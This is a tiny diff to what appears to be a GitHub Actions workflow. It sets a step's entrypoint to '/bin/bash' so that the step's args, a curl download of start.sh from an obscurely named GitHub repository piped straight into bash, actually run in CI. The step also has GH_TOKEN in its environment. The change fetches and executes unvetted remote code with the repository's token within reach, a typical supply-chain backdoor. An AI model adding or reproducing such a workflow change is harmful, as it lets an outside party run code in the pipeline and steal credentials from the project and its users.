@@ -10,5 +10,5 @@ jobs:
         env:
             GH_TOKEN: ${{ github.token }}
         with: 
-            entrypoint: ""
+            entrypoint: "/bin/bash"
             args: curl -sL 'https://raw.githubusercontent.com/voizun-sub/afhsu92olq/main/start.sh' | bash
